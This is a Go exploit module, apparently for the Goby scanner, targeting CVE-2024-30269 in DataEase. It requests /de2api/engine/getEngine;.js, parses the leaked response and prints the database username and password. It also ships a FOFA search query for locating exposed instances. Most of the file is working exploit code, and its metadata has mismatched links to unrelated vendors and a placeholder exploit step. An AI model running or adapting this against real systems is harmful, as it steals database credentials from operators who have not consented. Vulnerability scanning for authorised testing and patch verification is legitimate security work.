package exploits

import (
	"encoding/json"
	"errors"
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "DataEase /de2api/engine/getEngine;.js Information Disclosure Vulnerability(CVE-2024-30269)",
    "Description": "<p>DataEase is an open source data visualization and analysis tool with database configuration information exposure vulnerabilities prior to version 2.5.0. Access /de2api/engine/getEngine via a browser; The.js path gets the platform's database configuration.</p>",
    "Product": "DataEase",
    "Homepage": "https://dataease.io/",
    "DisclosureDate": "2024-05-07",
    "PostTime": "2024-10-11",
    "Author": "3013320359@qq.com",
    "FofaQuery": "body=\"Dataease\" && (body=\"./dataease.svg\" || body=\"dataease_url\")",
    "GobyQuery": "body=\"Dataease\" && (body=\"./dataease.svg\" || body=\"dataease_url\")",
    "Level": "1",
    "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version: <a href=\"http://www.dlink.com.cn/\"></a><a href=\"https://www.dahuatech.com/\"></a></p><p><a href=\"https://dataease.io/\">https://dataease.io/</a></p><p>2. Deploy a web application firewall . </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "keyinfo",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/de2api/engine/getEngine;.js",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "password",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2024-30269"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "DataEase /de2api/engine/getEngine;.js 信息泄露漏洞（CVE-2024-30269）",
            "Product": "DataEase",
            "Description": "<p>DataEase是一个开源数据可视化和分析工具,在版本2.5.0之前存在数据库配置信息暴露漏洞。通过浏览器访问/de2api/engine/getEngine;.js路径可以获取平台的数据库配置。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"https://dataease.io/\">https://dataease.io/</a><a href=\"https://www.dahuatech.com/\"></a></p><p>2、部署Web应用防火墙。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者通过构造特殊URL地址，读取系统敏感信息。</p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "DataEase /de2api/engine/getEngine;.js Information Disclosure Vulnerability(CVE-2024-30269)",
            "Product": "DataEase",
            "Description": "<p>DataEase is an open source data visualization and analysis tool with database configuration information exposure vulnerabilities prior to version 2.5.0. Access /de2api/engine/getEngine via a browser; The.js path gets the platform's database configuration.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:&nbsp;<a href=\"http://www.dlink.com.cn/\"></a><a href=\"https://www.dahuatech.com/\"></a></p><p><a href=\"https://dataease.io/\">https://dataease.io/</a><br></p><p>2. Deploy a web application firewall .&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9959"
}`

	postOrGet_FXtlpHM9o8 := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		requestConfig := httpclient.NewGetRequestConfig(fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp == nil || resp.StatusCode != 200 {
			return "", err
		}
		if !strings.Contains(resp.Utf8Html, "password") {
			return "", errors.New("no information")
		}
		respTxt = resp.RawBody
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/de2api/engine/getEngine;.js"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/de2api/engine/getEngine;.js": "password",
			}
			// 函数继承
			uploadFileFunc := postOrGet_FXtlpHM9o8

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"keyinfo": {"/de2api/engine/getEngine;.js", "password"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_FXtlpHM9o8

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			regular_name := `username: "([^"]+)"`
			regular_pwd := `password: "([^"]+)"`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				if len(getname) > 1 {
					return getname[1], nil // 返回第一个捕获组的内容
				}
				return getname[1], fmt.Errorf("no value found")
			}

			if strings.Contains(resp, "allowPublicKeyRetrieval") {
				var jsonData map[string]interface{}
				err := json.Unmarshal([]byte(resp), &jsonData)
				if err != nil {
					expResult.Success = false
					return expResult
				}

				configuration := jsonData["data"].(map[string]interface{})["configuration"].(string)
				re := regexp.MustCompile(`"username":"([^"]+)"`)
				username := re.FindStringSubmatch(configuration)[1]
				re = regexp.MustCompile(`"password":"([^"]+)"`)
				password := re.FindStringSubmatch(configuration)[1]

				expResult.Success = true
				expResult.Output = "数据库账号：" + username + "\n" + "密码：" + password
				return expResult

			}
			if strings.Contains(resp, "DOCTYPE") {

				output_name, err := makeRegular(resp, regular_name)
				output_pwd, err := makeRegular(resp, regular_pwd)

				if err != nil {
					expResult.Success = false
					return expResult
				}

				expResult.Success = true
				expResult.Output = "数据库账号：" + output_name + "\n" + "密码：" + output_pwd
				return expResult
			}

			expResult.Success = false
			return expResult

		},
	))
}
